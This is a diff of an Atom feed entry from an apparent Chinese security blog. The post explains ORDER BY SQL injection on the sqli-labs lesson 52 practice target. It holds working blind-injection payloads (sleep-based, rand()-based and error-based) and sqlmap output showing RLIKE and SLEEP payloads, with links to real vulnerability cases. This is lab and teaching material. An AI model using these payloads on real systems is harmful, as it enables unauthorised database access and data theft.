@@ -34,7 +34,7 @@
     <link href="http://xdxd.love/2016/03/07/order-by%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"/>
     <id>http://xdxd.love/2016/03/07/order-by注入点利用方式/</id>
     <published>2016-03-07T02:00:56.000Z</published>
-    <updated>2016-03-07T08:49:32.000Z</updated>
+    <updated>2016-03-08T07:58:08.000Z</updated>
     <content type="html"><![CDATA[<h1 id="漏洞分析">漏洞分析</h1><p>使用<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">sqli-lab</a>中的lesson-52作为测试目标。关键代码为：</p>
 <pre><code>error_reporting(<span class="number">0</span>);
 <span class="variable">$id</span>=$_GET[<span class="string">'sort'</span>];  
@@ -51,19 +51,41 @@
 </code></pre><p>可以通过asc 和desc查看返回数据是否相同来简单判断是否存在orderby注入。</p>
 <p><img src="/images/orderby1.png" alt=""></p>
 <p><img src="/images/orderby2.png" alt=""></p>
-<h1 id="利用方式：">利用方式：</h1><p>order by的语法如下：</p>
-<pre><code>[<span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="comment">{col_name | expr | position}</span>
-  [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>], ...]
-</code></pre><p>order by后面可以加字段名，表达式和字段的位置，字段的位置需要是整数型。</p>
-<p>盲注：</p>
-<h2 id="知道字段名">知道字段名</h2><p>1，使用 if(1&lt;2,id,domain)或者类似的表达式来布尔盲注或者时间盲注。</p>
+<h1 id="利用方式：">利用方式：</h1><p>mysql 5中 select order by的语法如下：</p>
+<pre><code><span class="operator"><span class="keyword">SELECT</span> 
+[ALL | <span class="keyword">DISTINCT</span> | <span class="keyword">DISTINCTROW</span> ] 
+  [<span class="keyword">HIGH_PRIORITY</span>] 
+  [<span class="keyword">STRAIGHT_JOIN</span>] 
+  [<span class="keyword">SQL_SMALL_RESULT</span>] [<span class="keyword">SQL_BIG_RESULT</span>] [<span class="keyword">SQL_BUFFER_RESULT</span>] 
+  [<span class="keyword">SQL_CACHE</span> | SQL_NO_CACHE] [<span class="keyword">SQL_CALC_FOUND_ROWS</span>] 
+select_expr [, select_expr ...] 
+[<span class="keyword">FROM</span> table_references 
+[<span class="keyword">WHERE</span> where_condition] 
+[<span class="keyword">GROUP</span> <span class="keyword">BY</span> {col_name | expr | <span class="keyword">position</span>} 
+  [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>], ... [<span class="keyword">WITH</span> <span class="keyword">ROLLUP</span>]] 
+[<span class="keyword">HAVING</span> where_condition] 
+[<span class="keyword">ORDER</span> <span class="keyword">BY</span> {col_name | expr | <span class="keyword">position</span>} 
+  [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>], ...] 
+[<span class="keyword">LIMIT</span> {[<span class="keyword">offset</span>,] <span class="keyword">row_count</span> | <span class="keyword">row_count</span> <span class="keyword">OFFSET</span> <span class="keyword">offset</span>}] 
+[<span class="keyword">PROCEDURE</span> procedure_name(argument_list)] 
+[<span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">'file_name'</span> export_options 
+  | <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">'file_name'</span> 
+  | <span class="keyword">INTO</span> var_name [, var_name]] 
+[<span class="keyword">FOR</span> <span class="keyword">UPDATE</span> | <span class="keyword">LOCK</span> <span class="keyword">IN</span> <span class="keyword">SHARE</span> <span class="keyword">MODE</span>]]</span>
+</code></pre><p>order by后面可以加字段名，表达式和字段的位置，字段的位置需要是整数型。由于order by 后面不可以跟union。</p>
+<p>比如：</p>
+<pre><code>select id ,rand(<span class="number">0</span>) from requests order by rand() <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1</span>
+</code></pre><p>会报错，Incorrect usage of UNION and ORDER BY</p>
+<p>所以通常的利用都是使用了一些技巧。</p>
+<h1 id="盲注：">盲注：</h1><h2 id="需要知道字段名">需要知道字段名</h2><p>1，使用 if(1&lt;2,id,domain)或者类似的表达式来布尔盲注或者时间盲注。</p>
 <pre><code>(<span class="operator"><span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> (<span class="literal">true</span>) <span class="keyword">then</span> <span class="keyword">id</span> <span class="keyword">else</span> price <span class="keyword">end</span>)
 
 <span class="keyword">if</span>((selectchar(<span class="keyword">substring</span>(table_name,<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">limit</span> <span class="number">1</span>)&lt;=<span class="number">128</span>),<span class="keyword">id</span>,price)</span>
 </code></pre><p>条件判断之后选择的字段名，id，domain，不能是1，2，所以一定要知道字段名。猜测是写1，2的话被判断为字符了。</p>
 <p>1,基于表达式结果盲注</p>
 <p>案例：<a href="http://www.wooyun.org/bugs/wooyun-2010-07406" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-07406</a></p>
-<h2 id="不需要知道字段名">不需要知道字段名</h2><p>基于order by 1,2 时间盲注：<br>payload:</p>
+<p>不过以上的这些技巧都需要一些条件，目前看来order by注入跟where条件注入具有同样的布尔盲注和时间注入的方式，利用方式也比较成熟。所以这些技巧只能用来开阔思路了。</p>
+<h2 id="成熟的利用方式">成熟的利用方式</h2><p>基于order by 1,2 时间盲注：<br>payload:</p>
 <pre><code><span class="built_in">asc</span>,<span class="keyword">if</span>(locate(\<span class="string">''</span>+payload+<span class="string">'\'</span>,substring(user(),<span class="string">'+str(i)+'</span>,<span class="number">1</span>)),<span class="built_in">sleep</span>(<span class="number">3</span>),<span class="number">1</span>)
 </code></pre><p>基于order by 1,2 引起mysql错误进行盲注 </p>
 <p>payload:</p>
@@ -72,9 +94,18 @@
 <p>案例：<a href="http://www.wooyun.org/bugs/wooyun-2010-076151" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-076151</a></p>
 <p>基于 order by rand(true);order by rand(false);返回不同进行盲注<br>payload:rand(ascii(mid(database(),1,1))=109)</p>
 <p>案例：<a href="http://www.wooyun.org/bugs/wooyun-2010-0152570" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0152570</a></p>
-<p>报错注入：</p>
-<p>跟常规报错注入相同</p>
-<h1 id="思考">思考</h1>]]></content>
+<p>关于order by rand(true)和order by rand(false)返回不同的培训原理是 order by rand()会随机给每个数据生成一个随机数，然后按照随机数培训，true和false实际上转成了整形的1和0作为rand()的种子，这样给每一列都会成一个固定的数，然后根据这个数来排序，所以结果会不同。</p>
+<p>参考这里的讨论：<a href="http://zone.wooyun.org/content/25733" target="_blank" rel="external">http://zone.wooyun.org/content/25733</a></p>
+<h2 id="sqlmap利用方式">sqlmap利用方式</h2><p>使用level5 risk3</p>
+<pre><code>Parameter: sort (<span class="keyword">GET</span>)
+    Type: <span class="built_in">boolean</span>-based blind
+    Title: MySQL RLIKE <span class="built_in">boolean</span>-based blind - <span class="keyword">WHERE</span>, HAVING, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause
+    Payload: sort=<span class="number">1</span> RLIKE (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="number">9644</span>=<span class="number">9644</span>) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0x28</span> <span class="keyword">END</span>))
+    Type: <span class="keyword">AND</span>/<span class="keyword">OR</span> time-based blind
+    Title: MySQL &gt;= <span class="number">5.0</span><span class="number">.12</span> <span class="keyword">AND</span> time-based blind (<span class="keyword">SELECT</span>)
+    Payload: sort=<span class="number">1</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span>(SLEEP(<span class="number">5</span>)))MVan)
+---
+</code></pre><h1 id="思考">思考</h1>]]></content>
     <summary type="html">
     <![CDATA[<h1 id="漏洞分析">漏洞分析</h1><p>使用<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">sqli-lab</a>中的lesson-52作为测试目标。关键代码为]]>
     </summary>
